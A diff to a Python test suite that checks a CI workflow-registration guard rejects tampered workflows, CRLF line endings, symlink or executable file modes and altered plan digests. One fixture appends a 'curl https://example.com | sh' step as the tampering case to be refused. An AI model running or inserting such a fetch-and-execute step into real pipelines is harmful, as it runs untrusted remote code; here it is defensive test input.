@@ -712,24 +712,40 @@ def test_lookup_rejects_forks_unregistered_and_missing_runs(
 
 
 def exit_git(
-    candidate: str, changed: str, files: dict[str, str] | None = None
-) -> Callable[[list[str]], str]:
-    """Return a Git stub that serves one candidate config, files, and diff."""
+    candidate: str,
+    changed: str,
+    files: dict[str, str | bytes] | None = None,
+    modes: dict[str, str] | None = None,
+) -> Callable[[list[str]], bytes]:
+    """Return a Git stub that serves one candidate config, files, and diff.
 
-    def git(args: list[str]) -> str:
+    Every path is a plain 100644 blob unless ``modes`` names another mode
+    for one ``revision:path``.
+    """
+    served: dict[str, str | bytes] = {
+        f"{HEAD}:.csarc/config.yml": candidate,
+        **(files or {}),
+    }
+
+    def git(args: list[str]) -> bytes:
         if args[0] == "show":
-            if args[1] == f"{HEAD}:.csarc/config.yml":
-                return candidate
-            if args[1] in (files or {}):
-                return (files or {})[args[1]]
+            if args[1] in served:
+                value = served[args[1]]
+                return value if isinstance(value, bytes) else value.encode()
             raise subprocess.CalledProcessError(128, ["git", *args])
+        if args[0] == "ls-tree":
+            assert args[2] == "--"
+            key = f"{args[1]}:{args[3]}"
+            mode = (modes or {}).get(key, "100644")
+            kind = "commit" if mode == "160000" else "blob"
+            return f"{mode} {kind} {'0' * 40}\t{args[3]}\n".encode()
         assert args == [
             "diff",
             "--no-renames",
             "--name-only",
             f"{BASE}...{HEAD}",
         ]
-        return changed
+        return changed.encode()
 
     return git
 
@@ -848,9 +864,9 @@ def provenance(environments: list[str], runner: object, **extra: object) -> str:
 
 def registration_files(
     environments: list[str] | None = None,
-    workflow: str | None = None,
+    workflow: str | bytes | None = None,
     record: str | None = None,
-) -> dict[str, str]:
+) -> dict[str, str | bytes]:
     """Return base and head files of a registration render."""
     after = environments or ["dev", "uat"]
     return {
@@ -865,7 +881,8 @@ def registration_files(
     }
 
 
-TAMPERED = registration_files()[f"{HEAD}:{WORKFLOW_PATH}"] + (
+REGISTERED_WORKFLOW = str(render(RUNNER, ["dev", "uat"])["_text"])
+TAMPERED = REGISTERED_WORKFLOW + (
     "      - name: Extra\n        run: curl https://example.com | sh\n"
 )
 
@@ -946,7 +963,7 @@ def test_only_a_first_registration_merges_on_local_evidence(
     base: str,
     candidate: str,
     changed: str,
-    files: dict[str, str],
+    files: dict[str, str | bytes],
     qualifies: bool,
     tmp_path: Path,
 ) -> None:
@@ -1011,6 +1028,34 @@ def test_only_a_first_registration_merges_on_local_evidence(
             WORKFLOW_PATH,
         ),
         (
+            "CRLF line endings in the workflow",
+            REG_RENDER,
+            registration_files(
+                workflow=REGISTERED_WORKFLOW.replace("\n", "\r\n").encode()
+            ),
+            WORKFLOW_PATH,
+        ),
+        (
+            "a lone CR in the workflow",
+            REG_RENDER,
+            registration_files(
+                workflow=REGISTERED_WORKFLOW.replace(
+                    "permissions:\n", "permissions:\r\n", 1
+                ).encode()
+            ),
+            WORKFLOW_PATH,
+        ),
+        (
+            "a new final plan digest",
+            REG_RENDER,
+            registration_files(
+                record=provenance(
+                    ["dev", "uat"], RUNNER, final_plan_sha256="9" * 64
+                )
+            ),
+            PROVENANCE_PATH,
+        ),
+        (
             "a provenance release change",
             REG_RENDER,
             registration_files(
@@ -1034,7 +1079,7 @@ def test_registration_with_anything_more_fails_closed(
     name: str,
     case: str,
     changed: str,
-    files: dict[str, str],
+    files: dict[str, str | bytes],
     rejected: str,
     tmp_path: Path,
 ) -> None:
@@ -1050,6 +1095,84 @@ def test_registration_with_anything_more_fails_closed(
         )
     assert rejected in str(error.value), case
     assert "(ADR Q12)" in str(error.value)
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("path", "revision", "mode"),
+    [
+        (WORKFLOW_PATH, HEAD, "120000"),
+        (WORKFLOW_PATH, HEAD, "100755"),
+        (PROVENANCE_PATH, HEAD, "120000"),
+        (".csarc/config.yml", HEAD, "120000"),
+        (".csarc/config.yml", HEAD, "100755"),
+        (WORKFLOW_PATH, BASE, "100755"),
+    ],
+)
+def test_registration_needs_plain_files_on_both_sides(
+    name: str, path: str, revision: str, mode: str, tmp_path: Path
+) -> None:
+    """#1317 review B: a symlink or executable bit never passes."""
+    with pytest.raises(RuntimeError, match="not a plain 100644 file") as error:
+        reader(name)["registration_reason"](
+            tmp_path,
+            write_config(tmp_path, CONFIG + UNREGISTERED),
+            lease(),
+            exit_git(
+                CONFIG + REGISTERED,
+                REG_RENDER,
+                registration_files(),
+                {f"{revision}:{path}": mode},
+            ),
+        )
+    assert f"registration: {path}" in str(error.value)
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("before", "after", "qualifies"),
+    [
+        ({"final_plan_sha256": "8" * 64}, {}, True),
+        (
+            {"final_plan_sha256": "8" * 64},
+            {"final_plan_sha256": "8" * 64},
+            True,
+        ),
+        (
+            {"final_plan_sha256": "8" * 64},
+            {"final_plan_sha256": "9" * 64},
+            False,
+        ),
+        ({}, {"final_plan_sha256": "9" * 64}, False),
+    ],
+)
+def test_registration_never_plants_a_final_plan_digest(
+    name: str,
+    before: dict[str, str],
+    after: dict[str, str],
+    qualifies: bool,
+    tmp_path: Path,
+) -> None:
+    """#1317 review C: the plan digest may stay or go, never change."""
+    files = {
+        **registration_files(),
+        f"{BASE}:{PROVENANCE_PATH}": provenance(["dev", "uat"], {}, **before),
+        f"{HEAD}:{PROVENANCE_PATH}": provenance(
+            ["dev", "uat"], RUNNER, **after
+        ),
+    }
+    check = reader(name)["registration_reason"]
+    arguments = (
+        tmp_path,
+        write_config(tmp_path, CONFIG + UNREGISTERED),
+        lease(),
+        exit_git(CONFIG + REGISTERED, REG_RENDER, files),
+    )
+    if qualifies:
+        assert "(ADR Q12)" in check(*arguments)
+    else:
+        with pytest.raises(RuntimeError, match="provenance"):
+            check(*arguments)
 
 
 @pytest.mark.parametrize("name", READERS)
@@ -1110,6 +1233,54 @@ def renamed_repository(
             "head_sha": run_git(repo, "rev-parse", "HEAD"),
         },
     }
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize("ending", [b"\n", b"\r\n"])
+def test_registration_compares_real_git_bytes(
+    name: str, ending: bytes, tmp_path: Path
+) -> None:
+    """#1317 review A: CRLF in a committed workflow is not the render."""
+    repo = tmp_path / "repo"
+    (repo / ".csarc").mkdir(parents=True)
+    (repo / ".github/workflows").mkdir(parents=True)
+    run_git(tmp_path, "init", "-q", str(repo))
+    for key, value in (
+        ("user.email", "test@example.com"),
+        ("user.name", "Test"),
+        ("core.autocrlf", "false"),
+    ):
+        run_git(repo, "config", key, value)
+    files = registration_files()
+    (repo / ".csarc/config.yml").write_text(
+        CONFIG + UNREGISTERED, encoding="utf-8"
+    )
+    (repo / WORKFLOW_PATH).write_text(
+        str(files[f"{BASE}:{WORKFLOW_PATH}"]), encoding="utf-8"
+    )
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "base")
+    base_sha = run_git(repo, "rev-parse", "HEAD")
+    (repo / ".csarc/config.yml").write_text(
+        CONFIG + REGISTERED, encoding="utf-8"
+    )
+    (repo / WORKFLOW_PATH).write_bytes(
+        str(files[f"{HEAD}:{WORKFLOW_PATH}"]).encode().replace(b"\n", ending)
+    )
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "head")
+    held = {
+        **lease(),
+        "base_sha": base_sha,
+        "head_sha": run_git(repo, "rev-parse", "HEAD"),
+    }
+    check = reader(name)["registration_reason"]
+    config = write_config(tmp_path, CONFIG + UNREGISTERED)
+    if ending == b"\n":
+        assert "(ADR Q12)" in check(repo, config, held)
+    else:
+        with pytest.raises(RuntimeError, match="csarc-verify"):
+            check(repo, config, held)
 
 
 @pytest.mark.parametrize("name", READERS)
